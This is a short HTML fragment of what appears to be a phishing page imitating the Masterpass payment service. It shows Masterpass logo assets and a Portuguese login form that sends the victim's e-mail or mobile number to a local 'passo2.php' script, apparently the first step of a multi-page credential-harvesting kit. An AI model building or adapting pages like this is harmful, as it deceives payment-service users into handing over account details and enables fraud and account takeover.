       ...
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                  <img alt="Masterpass" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="https://masterpass.com/switchui/images/logo/global/header-mpass-hero.svg" style="">
               </div>
           </div> 
       </div>
   </header>
                       ...
                       <form class="ng-valid-maxlength ng-dirty ng-valid-parse ng-valid-required ng-valid-username ng-valid ng-valid-email" action="passo2.php" method="POST">
                           <div class="form-block">
                             <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">
                                 <div>
                                     <input class="form-control ng-valid-maxlength ng-touched ng-not-empty ng-dirty ng-valid-parse ng-valid-required ng-valid-username ng-valid ng-valid-email" name="telefone" id="telefone" placeholder="E-mail ou Número de Celular" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um telefone válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('(##)#####-####', this);javascript:pulacampo('telefone','continue');" type="tel" maxlength="13" autofocus required>
                                 </div>
                             </div>
                           </div>
                           <div class="row">
